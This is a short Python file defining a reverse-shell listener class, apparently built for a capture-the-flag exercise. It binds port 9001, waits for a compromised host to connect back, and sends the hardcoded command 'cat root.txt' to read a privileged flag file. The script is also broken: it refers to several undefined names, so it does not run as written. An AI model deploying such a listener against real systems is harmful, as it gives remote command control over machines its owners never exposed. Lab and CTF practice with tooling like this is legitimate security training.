import socket

class Revsh(object):
    
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 9001
        self.buffer_size = 1024 * 512
        s = socket.socket()

        s.bind((self.host, self.port))

        s.listen(5)
        print(f"Listening as {self.host}:{self.port} ...")

        self.client_socket, self.client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")

        
    def send_command(self):
        # get the command from prompt
        command = "cat root.txt"
        # send the command to the client
        self.client_socket.send(command.encode('utf-8') + b"\n")
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        # split command output and current directory
        # results, cwd = output.split(SEPARATOR)
        # print output
        print(output)

        
